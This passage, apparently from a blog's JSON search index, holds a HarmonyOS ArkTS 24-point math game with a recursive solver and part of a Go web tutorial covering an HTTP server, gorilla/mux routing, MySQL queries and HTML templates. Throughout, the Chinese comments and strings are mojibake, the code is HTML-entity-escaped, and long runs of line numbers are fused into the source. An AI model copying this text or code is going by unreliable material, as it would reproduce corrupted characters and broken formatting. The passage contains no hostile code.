‡é¢˜ message: `å¾—åˆ†ï¼š$&#123;currentScore&#125;`, // æ˜¾ç¤ºå¾—åˆ†ä¿¡æ¯ confirm: &#123; // ç¡®è®¤æŒ‰é’®é…ç½® defaultFocus: true, // é»˜è®¤ç„¦ç‚¹ value: &#x27;æˆ‘çŸ¥é“äº†&#x27;, // æŒ‰é’®æ–‡æœ¬ action: () =&gt; &#123; // ç‚¹å‡»åçš„åŠ¨ä½œ // è¿™é‡Œå¯ä»¥æ·»åŠ ç‚¹å‡»ç¡®è®¤åçš„é€»è¾‘ &#125; &#125;, onWillDismiss: () =&gt; &#123; // å…³é—­å‰çš„åŠ¨ä½œ // è¿™é‡Œå¯ä»¥æ·»åŠ å…³é—­å‰çš„é€»è¾‘ &#125;, alignment: DialogAlignment.Center, // å¯¹é½æ–¹å¼ä¸ºä¸­å¿ƒ &#125;); this.endGame() // ç»“æŸæ¸¸æˆ &#125; &#125;) Text(`å½“å‰å¾—åˆ†ï¼š$&#123;this.currentScore&#125;`) // æ˜¾ç¤ºå½“å‰å¾—åˆ† Button(&#x27;å¼€å§‹æ¸¸æˆ&#x27;).clickEffect(&#123; level: ClickEffectLevel.LIGHT &#125;).onClick(() =&gt; &#123; // åˆ›å»ºå¼€å§‹æ¸¸æˆæŒ‰é’® this.startGame() // ç‚¹å‡»åå¼€å§‹æ¸¸æˆ &#125;) Button(&#x27;ç»“æŸæ¸¸æˆ&#x27;).clickEffect(&#123; level: ClickEffectLevel.LIGHT &#125;).onClick(() =&gt; &#123; // åˆ›å»ºç»“æŸæ¸¸æˆæŒ‰é’® this.endGame() // ç‚¹å‡»åç»“æŸæ¸¸æˆ &#125;) &#125;.layoutWeight(1) // è®¾ç½®å¸ƒå±€æƒé‡ &#125; .height(&#x27;100%&#x27;) // è®¾ç½®æ•´ä½“é«˜åº¦ä¸º100% .width(&#x27;100%&#x27;) // è®¾ç½®æ•´ä½“å®½åº¦ä¸º100% .backgroundColor(&quot;#61ac57&quot;) // è®¾ç½®èƒŒæ™¯é¢œè‰² .justifyContent(FlexAlign.SpaceBetween) // è®¾ç½®å†…å®¹å¯¹é½æ–¹å¼ &#125;&#125; 24å·§ç®—24ç‚¹æ˜¯ä¸€ä¸ªç»å…¸çš„æ•°å­¦æ¸¸æˆï¼Œå…¶è§„åˆ™ç®€å•è€Œå¯Œæœ‰æŒ‘æˆ˜æ€§ï¼šç©å®¶éœ€åˆ©ç”¨ç»™å®šçš„å››ä¸ªæ•°å­—ï¼Œé€šè¿‡åŠ ã€å‡ã€ä¹˜ã€é™¤è¿ç®—ï¼Œä½¿å¾—è®¡ç®—ç»“æœç­‰äº24ã€‚## ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27; // å¯¼å…¥ç”¨äºæç¤ºç”¨æˆ·çš„å·¥å…·åŒ…@ObservedV2 // è£…é¥°å™¨ï¼Œä½¿ç±»æˆä¸ºå¯è§‚å¯Ÿå¯¹è±¡class Cell &#123; // å®šä¹‰ä¸€ä¸ªCellç±»ï¼Œä»£è¡¨æ¸¸æˆä¸­çš„ä¸€ä¸ªå•å…ƒæ ¼ @Trace value: number // ä½¿ç”¨è£…é¥°å™¨æ ‡è®°valueå±æ€§ï¼Œä½¿å…¶æˆä¸ºè¿½è¸ªå±æ€§ @Trace displayValue: string // åŒä¸Šï¼Œç”¨äºæ˜¾ç¤ºçš„å€¼ @Trace isVisible: boolean // åŒä¸Šï¼Œåˆ¤æ–­æ˜¯å¦å¯è§ @Trace xPosition: number // åŒä¸Šï¼Œxåæ ‡ä½ç½® @Trace yPosition: number // åŒä¸Šï¼Œyåæ ‡ä½ç½® columnIndex: number // åˆ—ç´¢å¼• rowIndex: number // è¡Œç´¢å¼• constructor(rowIndex: number, columnIndex: number) &#123; // æ„é€ å‡½æ•° this.rowIndex = rowIndex // è®¾ç½®è¡Œç´¢å¼• this.columnIndex = columnIndex // è®¾ç½®åˆ—ç´¢å¼• this.xPosition = 0 // åˆå§‹åŒ–xåæ ‡ä½ç½® this.yPosition = 0 // åˆå§‹åŒ–yåæ ‡ä½ç½® this.value = 0 // åˆå§‹åŒ–æ•°å€¼ this.displayValue = &#x27;&#x27; // åˆå§‹åŒ–æ˜¾ç¤ºå€¼ this.isVisible = true // åˆå§‹åŒ–å¯è§æ€§ &#125; setDefaultValue(value: number) &#123; // è®¾ç½®å•å…ƒæ ¼çš„é»˜è®¤å€¼ this.value = value // è®¾ç½®æ•°å€¼ this.displayValue = `$&#123;value&#125;` // è®¾ç½®æ˜¾ç¤ºå€¼ this.isVisible = true // è®¾ç½®ä¸ºå¯è§ &#125; performOperation(otherCell: Cell, operationName: string) &#123; // æ‰§è¡Œä¸å…¶ä»–å•å…ƒæ ¼çš„æ“ä½œ switch (operationName) &#123; // æ ¹æ®æ“ä½œåç§°è¿›è¡Œä¸åŒçš„è¿ç®— case &quot;åŠ &quot;: // å¦‚æœæ˜¯åŠ æ³• this.value = otherCell.value + this.value // è®¡ç®—æ–°å€¼ break // ç»“æŸcaseå— case &quot;å‡&quot;: // å¦‚æœæ˜¯å‡æ³• this.value = otherCell.value - this.value // è®¡ç®—æ–°å€¼ break // ç»“æŸcaseå— case &quot;ä¹˜&quot;: // å¦‚æœæ˜¯ä¹˜æ³• this.value = otherCell.value * this.value // è®¡ç®—æ–°å€¼ break // ç»“æŸcaseå— case &quot;é™¤&quot;: // å¦‚æœæ˜¯é™¤æ³• if (this.value === 0) &#123; // æ£€æŸ¥é™¤æ•°æ˜¯å¦ä¸º0 promptAction.showToast(&#123; message: &#x27;é™¤æ•°ä¸èƒ½ä¸º0&#x27;, bottom: 400 &#125;) // æç¤ºé”™è¯¯ä¿¡æ¯ return false // è¿”å›falseï¼Œè¡¨ç¤ºæ“ä½œæ— æ•ˆ &#125; this.value = otherCell.value / this.value // è®¡ç®—æ–°å€¼ break // ç»“æŸcaseå— &#125; otherCell.isVisible = false // éšè—å‚ä¸è¿ç®—çš„å¦ä¸€ä¸ªå•å…ƒæ ¼ this.displayValue = `$&#123;this.value &gt;= 0 ? &#x27;&#x27; : &#x27;-&#x27;&#125;$&#123;this.convertToFraction(Math.abs(this.value))&#125;` // æ›´æ–°æ˜¾ç¤ºå€¼ return true // è¿”å›trueï¼Œè¡¨ç¤ºæ“ä½œæˆåŠŸ &#125; findGreatestCommonDivisor(a: number, b: number): number &#123; // è®¡ç®—ä¸¤ä¸ªæ•°çš„æœ€å¤§å…¬çº¦æ•° return b === 0 ? a : this.findGreatestCommonDivisor(b, a % b) // ä½¿ç”¨é€’å½’ç®—æ³•æ±‚æœ€å¤§å…¬çº¦æ•° &#125; convertToFraction(decimal: number): string &#123; // å°†å°æ•°è½¬æ¢ä¸ºåˆ†æ•°å½¢å¼ let tolerance = 1.0E-6 // è®¾ç½®å®¹å·®å€¼ let maxIterations = 1000 // è®¾ç½®æœ€å¤§è¿­ä»£æ¬¡æ•° let pNumerator = 1 // åˆ†å­åˆå§‹åŒ– let pDenominator = 0 // åˆ†æ¯åˆå§‹åŒ– let qNumerator = 0 // è¾…åŠ©å˜é‡ let qDenominator = 1 // è¾…åŠ©å˜é‡ let currentDecimal = decimal // å½“å‰å¤„ç†çš„å°æ•° let iterationCount = 0 // è¿­ä»£è®¡æ•° do &#123; // æ‰§è¡Œç›´åˆ°æ»¡è¶³æ¡ä»¶ let integerPart = Math.floor(currentDecimal) // å–æ•´éƒ¨åˆ† let temp = pNumerator // ä¸´æ—¶ä¿å­˜åˆ†å­ pNumerator = integerPart * pNumerator + pDenominator // æ›´æ–°åˆ†å­ pDenominator = temp // æ›´æ–°åˆ†æ¯ temp = qNumerator // ä¸´æ—¶ä¿å­˜è¾…åŠ©å˜é‡ qNumerator = integerPart * qNumerator + qDenominator // æ›´æ–°è¾…åŠ©å˜é‡ qDenominator = temp // æ›´æ–°è¾…åŠ©å˜é‡ currentDecimal = 1 / (currentDecimal - integerPart) // æ›´æ–°å°æ•°éƒ¨åˆ† iterationCount++ // å¢åŠ è¿­ä»£è®¡æ•° &#125; while (Math.abs(decimal - pNumerator / qNumerator) &gt; decimal * tolerance &amp;&amp; iterationCount &lt; maxIterations) // ç»§ç»­è¿­ä»£ç›´åˆ°è¾¾åˆ°å®¹å·®æˆ–æœ€å¤§è¿­ä»£æ¬¡æ•° if (iterationCount &gt;= maxIterations) &#123; // å¦‚æœè¾¾åˆ°æœ€å¤§è¿­ä»£æ¬¡æ•° return `$&#123;decimal&#125;` // è¿”å›åŸå°æ•° &#125; let gcdValue = this.calculateIterativeGcd(pNumerator, qNumerator) // è®¡ç®—åˆ†å­å’Œåˆ†æ¯çš„æœ€å¤§å…¬çº¦æ•° let reducedNumerator = pNumerator / gcdValue // åŒ–ç®€åçš„åˆ†å­ let reducedDenominator = qNumerator / gcdValue // åŒ–ç®€åçš„åˆ†æ¯ return `$&#123;reducedNumerator&#125;$&#123;reducedDenominator !== 1 ? &#x27;/&#x27; + reducedDenominator : &#x27;&#x27;&#125;` // è¿”å›åŒ–ç®€åçš„åˆ†æ•°å½¢å¼ &#125; calculateIterativeGcd(a: number, b: number): number &#123; // ä½¿ç”¨è¿­ä»£æ–¹å¼è®¡ç®—ä¸¤ä¸ªæ•°çš„æœ€å¤§å…¬çº¦æ•° while (b !== 0) &#123; // å½“bä¸ä¸º0æ—¶ç»§ç»­ let temp = b // ä¸´æ—¶ä¿å­˜b b = a % b // æ›´æ–°b a = temp // æ›´æ–°a &#125; return a // è¿”å›æœ€å¤§å…¬çº¦æ•° &#125;&#125;class JudgePointSolution &#123; // å®šä¹‰JudgePointSolutionç±»ï¼Œç”¨äºå¯»æ‰¾24ç‚¹æ¸¸æˆçš„è§£ solutions: string[] = [] // å­˜å‚¨æ‰¾åˆ°çš„è§£ accuracyThreshold = Math.pow(10, -6) // è®¾ç½®ç²¾åº¦é˜ˆå€¼ operations = [// å®šä¹‰å››ç§åŸºæœ¬è¿ç®— (a: number, b: number) =&gt; a + b, // åŠ æ³• (a: number, b: number) =&gt; a * b, // ä¹˜æ³• (a: number, b: number) =&gt; a - b, // å‡æ³• (a: number, b: number) =&gt; a / b,// é™¤æ³• ] searchSolutions(currentNumbers: number[], pathExpression: string) &#123; // æŸ¥æ‰¾è§£çš„é€’å½’æ–¹æ³• if (this.solutions.length &gt; 0) &#123; // å¦‚æœå·²ç»æ‰¾åˆ°è§£ï¼Œåˆ™è¿”å› return &#125; if (currentNumbers.length === 1) &#123; // å¦‚æœåªå‰©ä¸‹ä¸€ä¸ªæ•° if (Math.abs(currentNumbers[0] - 24) &lt; this.accuracyThreshold) &#123; // å¦‚æœè¯¥æ•°ç­‰äº24ï¼ˆåœ¨é˜ˆå€¼èŒƒå›´å†…ï¼‰ this.solutions.push(pathExpression) // å°†è·¯å¾„è¡¨è¾¾å¼ä½œä¸ºè§£åŠ å…¥æ•°ç»„ &#125; return // ç»“æŸé€’å½’ &#125; for (let i = 0; i &lt; currentNumbers.length - 1; i++) &#123; // å¯¹æ‰€æœ‰æ•°è¿›è¡Œä¸¤ä¸¤ç»„åˆ for (let j = i + 1; j &lt; currentNumbers.length; j++) &#123; // å¯¹æ‰€æœ‰æ•°è¿›è¡Œä¸¤ä¸¤ç»„åˆ const tempNumbers = this.removeNumberFromArray(currentNumbers, i, j) // åˆ›å»ºæ–°çš„æ•°ç»„ï¼Œç§»é™¤å½“å‰ä¸¤ä¸ªæ•° for (let k = 0; k &lt; 4; k++) &#123; // å¯¹å››ç§è¿ç®—åˆ†åˆ«å°è¯• let tempPath = pathExpression.length &gt; 0 ? `$&#123;pathExpression&#125;, ` : &#x27;&#x27; // æ ¼å¼åŒ–è·¯å¾„è¡¨è¾¾å¼ tempPath += `($&#123;currentNumbers[i]&#125; $&#123;this.getOperationSymbol(k)&#125; $&#123;currentNumbers[j]&#125;)` // æ·»åŠ å½“å‰è¿ç®—è¡¨è¾¾å¼åˆ°è·¯å¾„ tempNumbers.push(this.operations[k](currentNumbers[i], currentNumbers[j])) // è®¡ç®—ç»“æœå¹¶åŠ å…¥ä¸´æ—¶æ•°ç»„ this.searchSolutions(tempNumbers, tempPath) // é€’å½’æŸ¥æ‰¾è§£ tempNumbers.pop() // ç§»é™¤æœ€åä¸€ä¸ªåŠ å…¥çš„ç»“æœ if (k === 2 || k === 3) &#123; // å¦‚æœæ˜¯å‡æ³•æˆ–é™¤æ³• let tempPathSwapped = pathExpression.length &gt; 0 ? `$&#123;pathExpression&#125;, ` : &#x27;&#x27; // æ ¼å¼åŒ–è·¯å¾„è¡¨è¾¾å¼ tempPathSwapped += `($&#123;currentNumbers[j]&#125; $&#123;this.getOperationSymbol(k)&#125; $&#123;currentNumbers[i]&#125;)` // æ·»åŠ å½“å‰è¿ç®—è¡¨è¾¾å¼åˆ°è·¯å¾„ tempNumbers.push(this.operations[k](currentNumbers[j], currentNumbers[i])) // è®¡ç®—ç»“æœå¹¶åŠ å…¥ä¸´æ—¶æ•°ç»„ this.searchSolutions(tempNumbers, tempPathSwapped) // é€’å½’æŸ¥æ‰¾è§£ tempNumbers.pop() // ç§»é™¤æœ€åä¸€ä¸ªåŠ å…¥çš„ç»“æœ &#125; &#125; &#125; &#125; &#125; find24Solutions(numbers: number[]): string[] &#123; // æŸ¥æ‰¾æ‰€æœ‰å¯èƒ½çš„è§£ this.solutions = [] // æ¸…ç©ºè§£æ•°ç»„ this.searchSolutions(numbers, &#x27;&#x27;) // å¼€å§‹æŸ¥æ‰¾ return this.solutions // è¿”å›è§£æ•°ç»„ &#125; getOperationSymbol(index: number): string &#123; // è·å–è¿ç®—ç¬¦å· const symbols = [&#x27;+&#x27;, &#x27;*&#x27;, &#x27;-&#x27;, &#x27;/&#x27;] // å®šä¹‰ç¬¦å·æ•°ç»„ return symbols[index] // è¿”å›å¯¹åº”çš„ç¬¦å· &#125; removeNumberFromArray(array: number[], index1: number, index2: number): number[] &#123; // ä»æ•°ç»„ä¸­ç§»é™¤æŒ‡å®šä½ç½®çš„å…ƒç´  const newArray: number[] = [] // æ–°æ•°ç»„ for (let k = 0; k &lt; array.length; k++) &#123; // éå†åŸå§‹æ•°ç»„ if (k !== index1 &amp;&amp; k !== index2) &#123; // å¦‚æœä¸æ˜¯éœ€è¦ç§»é™¤çš„ä½ç½® newArray.push(array[k]) // å°†å…ƒç´ åŠ å…¥æ–°æ•°ç»„ &#125; &#125; return newArray // è¿”å›æ–°æ•°ç»„ &#125;&#125;@Entry@Componentstruct GameIndex &#123; @State randomNumbers: number[] = [] // ç”¨äºå­˜å‚¨éšæœºç”Ÿæˆçš„æ¸¸æˆæ•°å­— @State symbols: string[] = [&quot;åŠ &quot;, &quot;å‡&quot;, &quot;ä¹˜&quot;, &quot;é™¤&quot;] // å­˜å‚¨æ¸¸æˆä¸­å¯ç”¨çš„è¿ç®—ç¬¦å·å­—ç¬¦ä¸²æ•°ç»„ @State cells: Cell[] = [// å­˜å‚¨æ¸¸æˆä¸­çš„å•å…ƒæ ¼å®ä¾‹æ•°ç»„ new Cell(0, 0), // åˆ›å»ºä½äºç¬¬0è¡Œç¬¬0åˆ—çš„å•å…ƒæ ¼ new Cell(0, 1), // åˆ›å»ºä½äºç¬¬0è¡Œç¬¬1åˆ—çš„å•å…ƒæ ¼ new Cell(1, 0), // åˆ›å»ºä½äºç¬¬1è¡Œç¬¬0åˆ—çš„å•å…ƒæ ¼ new Cell(1, 1)// åˆ›å»ºä½äºç¬¬1è¡Œç¬¬1åˆ—çš„å•å…ƒæ ¼ ] @State selectedNumberIndex: number = -1 // å­˜å‚¨é€‰ä¸­çš„æ•°å­—å•å…ƒæ ¼çš„ç´¢å¼•ï¼Œé»˜è®¤ä¸º-1è¡¨ç¤ºæœªé€‰æ‹© @State selectedSymbolIndex: number = -1 // å­˜å‚¨é€‰ä¸­çš„è¿ç®—ç¬¦å·çš„ç´¢å¼•ï¼Œé»˜è®¤ä¸º-1è¡¨ç¤ºæœªé€‰æ‹© @State showSolution: boolean = false // æ§åˆ¶æ˜¯å¦æ˜¾ç¤ºæ¸¸æˆçš„è§£å†³æ–¹æ¡ˆï¼Œé»˜è®¤ä¸ºä¸æ˜¾ç¤º cellWidth: number = 250 // å•ä¸ªå•å…ƒæ ¼çš„å®½åº¦ cellMargin: number = 15 // å•å…ƒæ ¼ä¹‹é—´çš„é—´è· judgePoint24Util: JudgePointSolution = new JudgePointSolution() // åˆ›å»ºä¸€ä¸ªJudgePointSolutionç±»çš„å®ä¾‹ï¼Œç”¨äºå¯»æ‰¾æ¸¸æˆçš„è§£ isShowAnim: boolean = false //å•å…ƒæ ¼æ˜¯å¦æ­£åœ¨ç§»åŠ¨ï¼Œè‹¥ç§»åŠ¨ä¸­ç¦æ­¢æ“ä½œä»¥é˜²é—ªé€€ aboutToAppear(): void &#123; this.resetGame() &#125; resetGame() &#123; this.randomNumbers = [] for (let i = 0; i &lt; this.cells.length; i++) &#123; let randomValue = Math.floor(Math.random() * 13) + 1 this.cells[i].setDefaultValue(randomValue) this.randomNumbers.push(randomValue) &#125; this.selectedNumberIndex = -1 this.selectedSymbolIndex = -1 this.showSolution = false let solutions = this.judgePoint24Util.find24Solutions(this.randomNumbers) console.info(`ã€$&#123;solutions&#125;ã€‘`) if (solutions.length === 0) &#123; console.info(`æ— è§£ï¼Œé‡æ–°å¾ªç¯`) this.resetGame() &#125; &#125; build() &#123; Column(&#123; space: 20 &#125;) &#123; // æ˜¾ç¤º/éšè— è§£å†³æ–¹æ¡ˆ Text(`$&#123;this.judgePoint24Util.find24Solutions(this.randomNumbers)&#125;`) .fontSize(20) .fontColor(Color.White) .backgroundColor(&quot;#ffa101&quot;) .visibility(this.showSolution ? Visibility.Visible : Visibility.Hidden) .padding(10) .borderRadius(10) // æ•°å­— Row() &#123; Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; ForEach(this.cells, (cell: Cell, index: number) =&gt; &#123; Text(`$&#123;cell.displayValue&#125;`) .fontSize(`$&#123;this.cellWidth / 3&#125;lpx`) .width(`$&#123;this.cellWidth&#125;lpx`) .height(`$&#123;this.cellWidth&#125;lpx`) .fontColor(cell !== this.cells[this.selectedNumberIndex] ? &quot;#ffffff&quot; : &quot;#fe4b00&quot;) .backgroundColor(cell !== this.cells[this.selectedNumberIndex] ? &quot;#ffa101&quot; : &quot;#fddf4b&quot;) .borderRadius(`$&#123;this.cellMargin&#125;lpx`) .margin(`$&#123;this.cellMargin&#125;lpx`) .textAlign(TextAlign.Center) .clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;) .visibility(cell.isVisible ? Visibility.Visible : Visibility.Hidden) .translate(&#123; x: `$&#123;cell.xPosition&#125;lpx`, y: `$&#123;cell.yPosition&#125;lpx` &#125;) .onClick(() =&gt; &#123; if (this.selectedNumberIndex === -1) &#123; this.selectedNumberIndex = index &#125; else if (this.selectedNumberIndex === index) &#123; this.selectedNumberIndex = -1 &#125; else if (this.selectedSymbolIndex === -1) &#123; console.info(`æœªé€‰æ‹©æ“ä½œç¬¦ï¼Œä»…æ”¹å˜é€‰ä¸­ä½ç½®`) this.selectedNumberIndex = index &#125; else &#123; if (this.isShowAnim) &#123; return &#125; this.isShowAnim = true animateToImmediately(&#123; duration: 300, onFinish: () =&gt; &#123; this.cells[this.selectedNumberIndex].xPosition = 0 // åŠ¨ç”»ç»“æŸåä½ç½®å½’0 this.cells[this.selectedNumberIndex].yPosition = 0 // åŠ¨ç”»ç»“æŸåä½ç½®å½’0 this.cells[index].performOperation( this.cells[this.selectedNumberIndex], this.symbols[this.selectedSymbolIndex] ) this.selectedNumberIndex = -1 this.selectedSymbolIndex = -1 // ç»Ÿè®¡ç»“æœ let countVisibleCells: number = 0 for (let i = 0; i &lt; this.cells.length; i++) &#123; if (this.cells[i].isVisible) &#123; countVisibleCells++ &#125; &#125; if (countVisibleCells === 1) &#123; // å½“å‰æ˜¯æœ€åä¸€ä¸ª promptAction.showDialog(&#123; title: &#x27;æ¸¸æˆç»“æŸ&#x27;, message: `$&#123;this.cells[index].value === 24 ? &#x27;ã€èƒœåˆ©ã€‘&#x27; : &#x27;ã€å¤±è´¥ã€‘&#x27;&#125;`, buttons: [&#123; text: &#x27;é‡æ–°å¼€å§‹&#x27;, color: &#x27;#ffa500&#x27; &#125;] &#125;).then(() =&gt; &#123; this.resetGame() &#125;) &#125; this.isShowAnim = false &#125;, &#125;, () =&gt; &#123; let temp = this.cellWidth + this.cellMargin // è¦ç§»åŠ¨çš„å•å…ƒæ ¼è·ç¦» let movingCell: Cell = this.cells[this.selectedNumberIndex] movingCell.xPosition = (cell.columnIndex - movingCell.columnIndex) * temp movingCell.yPosition = (cell.rowIndex - movingCell.rowIndex) * temp &#125;) &#125; &#125;) &#125;) &#125;.width(`$&#123;this.cellWidth * 2 + this.cellMargin * 4&#125;lpx`) &#125;.width(&#x27;100%&#x27;).justifyContent(FlexAlign.Center) // æ“ä½œç¬¦ Row() &#123; Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; ForEach(this.symbols, (symbol: string, index: number) =&gt; &#123; Text(`$&#123;symbol&#125;`) .fontSize(`$&#123;this.cellWidth / 4&#125;lpx`) .width(`$&#123;this.cellWidth / 2&#125;lpx`) .height(`$&#123;this.cellWidth / 2&#125;lpx`) .fontColor(this.selectedSymbolIndex !== index ? &quot;#c16cf9&quot; : &quot;#fcfeff&quot;) .backgroundColor(this.selectedSymbolIndex !== index ? Color.Transparent : &quot;#c16cf9&quot;) .borderRadius(`$&#123;this.cellMargin&#125;lpx`) .margin(`$&#123;this.cellMargin / 2&#125;lpx`) .textAlign(TextAlign.Center) .clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;) .onClick(() =&gt; &#123; if (this.selectedSymbolIndex === index) &#123; this.selectedSymbolIndex = -1 &#125; else &#123; this.selectedSymbolIndex = index &#125; &#125;) &#125;) &#125;.width(`$&#123;this.cellWidth * 2 + this.cellMargin * 4&#125;lpx`) &#125;.width(&#x27;100%&#x27;).justifyContent(FlexAlign.Center) // é‡æ–°å¼€å§‹ / è§£å†³æ–¹æ¡ˆ Row() &#123; Button(&#x27;é‡æ–°å¼€å§‹&#x27;).clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;).onClick(() =&gt; &#123; this.resetGame() &#125;) Button(&#x27;è§£å†³æ–¹æ¡ˆ&#x27;).clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;).onClick(() =&gt; &#123; this.showSolution = !this.showSolution &#125;) &#125;.width(&#x27;100%&#x27;).justifyContent(FlexAlign.SpaceEvenly) &#125; .width(&#x27;100%&#x27;).height(&#x27;100%&#x27;) .backgroundColor(&quot;#0d1015&quot;) .padding(20) &#125;&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HarmonyOS","slug":"HarmonyOS","permalink":"https://banjinmei.github.io/tags/HarmonyOS/"},{"name":"WorldTime","slug":"WorldTime","permalink":"https://banjinmei.github.io/tags/WorldTime/"}],"author":"mu"},{"title":"Golang Web Base","slug":"Golang-Base","date":"2024-06-13T21:53:14.000Z","updated":"2024-06-18T15:13:26.000Z","comments":true,"path":"2024/06/14/Golang-Base/","permalink":"https://banjinmei.github.io/2024/06/14/Golang-Base/","excerpt":"","text":"setupwindowsç¯å¢ƒå®‰è£…windowsç¯å¢ƒä¸‹ï¼Œgoå®‰è£…åŒ…å®‰è£…æˆåŠŸåï¼Œä¼šè‡ªåŠ¨å°†goæ·»åŠ åˆ°pathç›®å½•ä¸‹ï¼Œæ‰€ä»¥ä¸éœ€è¦å†å‘Pathç¯å¢ƒå˜é‡ä¸­æ·»åŠ go GOROOTè®¾ç½®ï¼šGoå®‰è£…è·¯å¾„ â€œæˆ‘çš„ç”µè„‘â€&#x3D;ã€‹â€œå±æ€§â€&#x3D;ã€‹â€œé«˜çº§ç³»ç»Ÿè®¾ç½®â€&#x3D;ã€‹â€œç¯å¢ƒå˜é‡â€&#x3D;ã€‹â€œç³»ç»Ÿç¯å¢ƒå˜é‡â€ï¼Œæ–°å¢GOROOTç¯å¢ƒå˜é‡ web123456789101112131415package mainimport ( &quot;fmt&quot; &quot;net/http&quot;)func main() &#123; http.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintf(w, &quot;Hello, m requested: %s\\n&quot;, r.URL.Path) &#125;) http.ListenAndServe(&quot;:24612&quot;, nil)&#125; Http Serverstatic 1234567891011121314 http.HandleFunc(&quot;/&quot;, func (w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintf(w, &quot;Welcome !&quot;) &#125;) fs := http.FileServer(http.Dir(&quot;static/&quot;)) http.Handle(&quot;/static/&quot;, http.StripPrefix(&quot;/static/&quot;, fs)) http.ListenAndServe(&quot;:24612&quot;, nil)````## gorilla/muxrouter```bashgo get github.com/gorilla/mux 1234567891011121314151617181920212223package mainimport ( &quot;fmt&quot; &quot;net/http&quot; &quot;github.com/gorilla/mux&quot;)func main() &#123; r := mux.NewRouter() r.HandleFunc(&quot;/books/&#123;title&#125;/page/&#123;page&#125;&quot;, func(w http.ResponseWriter, r *http.Request) &#123; vars := mux.Vars(r) title := vars[&quot;title&quot;] page := vars[&quot;page&quot;] fmt.Fprintf(w, &quot; book: %s on page %s\\n&quot;, title, page) &#125;) http.ListenAndServe(&quot;:24612&quot;, r)&#125;//http://localhost:24612/books/mybook/page/1 sql123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103package mainimport ( &quot;database/sql&quot; &quot;fmt&quot; &quot;log&quot; &quot;time&quot; _ &quot;github.com/go-sql-driver/mysql&quot;)func main() &#123; db, err := sql.Open(&quot;mysql&quot;, &quot;root:xxx@(119.23.xxx.xxx:123)/TestDB?parseTime=true&quot;) if err != nil &#123; log.Fatal(err) &#125; if err := db.Ping(); err != nil &#123; log.Fatal(err) &#125; // &#123; // Create a new table // query := ` // CREATE TABLE users ( // id INT AUTO_INCREMENT, // username TEXT NOT NULL, // password TEXT NOT NULL, // created_at DATETIME, // PRIMARY KEY (id) // );` // if _, err := db.Exec(query); err != nil &#123; // log.Fatal(err) // &#125; // &#125; &#123; // Insert a new user username := &quot;m24612&quot; password := &quot;secret&quot; createdAt := time.Now() result, err := db.Exec(`INSERT INTO users (username, password, created_at) VALUES (?, ?, ?)`, username, password, createdAt) if err != nil &#123; log.Fatal(err) &#125; id, err := result.LastInsertId() fmt.Println(id) &#125; &#123; // Query a single user var ( id int username string password string createdAt time.Time ) query := &quot;SELECT id, username, password, created_at FROM users WHERE id = ?&quot; if err := db.QueryRow(query, 1).Scan(&amp;id, &amp;username, &amp;password, &amp;createdAt); err != nil &#123; log.Fatal(err) &#125; fmt.Println(id, username, password, createdAt) &#125; &#123; // Query all users type user struct &#123; id int username string password string createdAt time.Time &#125; rows, err := db.Query(`SELECT id, username, password, created_at FROM users`) if err != nil &#123; log.Fatal(err) &#125; defer rows.Close() var users []user for rows.Next() &#123; var u user err := rows.Scan(&amp;u.id, &amp;u.username, &amp;u.password, &amp;u.createdAt) if err != nil &#123; log.Fatal(err) &#125; users = append(users, u) &#125; if err := rows.Err(); err != nil &#123; log.Fatal(err) &#125; fmt.Printf(&quot;%#v&quot;, users) &#125; // &#123; // _, err := db.Exec(`DELETE FROM users WHERE id = ?`, 1) // if err != nil &#123; // log.Fatal(err) // &#125; // &#125;&#125; Template123456789101112131415161718192021222324252627282930313233343536373839package mainimport ( &quot;html/template&quot; &quot;net/http&quot;)type Todo struct &#123; Title string Done bool&#125;type TodoPageData struct &#123; PageTitle string Todos []Todo&#125;func main() &#123; tmpl := template.Must(template.ParseFiles(&quot;layout.html&quot;)) http.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) &#123; data := TodoPageData&#123; PageTitle: &quot;My TODO list&quot;, Todos: []Todo&#123; &#123;Title: &quot;Task 1&quot;, Done: false&#125;, &#123;Title: &quot;Task 2&quot;, Done: true&#125;, &#123;Title: &quot;Task 3&quot;, Done: true&#125;, &#125;, &#125; tmpl.Execute(w, data) &#125;) http.ListenAndServe(&quot;:80&quot;, nil)&#125; html 12345678910&lt;h1&gt;&#123;&#123;.PageTitle&#125;&#125;&lt;/h1&gt;&lt;ul&gt; &#123;&#123;range .Todos&#125;&#125; &#123;&#123;if .Done&#125;&#125; &lt;li class=&quot;done&quot;&gt;&#123;&#123;.Title&#125;&#125;&lt;/li&gt; &#123;&#123;else&#125;&#125; &lt;li&gt;&#123;&#123;.Title&#125;&#125;&lt;/li&gt; &#123;&#123;end&#125;&#125; &#123;&#123;end&#125;&#125;&lt;/ul&gt; static123456789101112131415161718192021222324252627282930313233package main import ( &quot;io/ioutil&quot; &quot;log&quot; &quot;net/http&quot; ) func main() &#123; // è®¾ç½® HTML æ–‡ä»¶çš„è·¯å¾„ htmlFilePath := &quot;static/test.html&quot; // åˆ›å»ºä¸€ä¸ª HTTP å¤„ç†ç¨‹åºæ¥æœåŠ¡ HTML 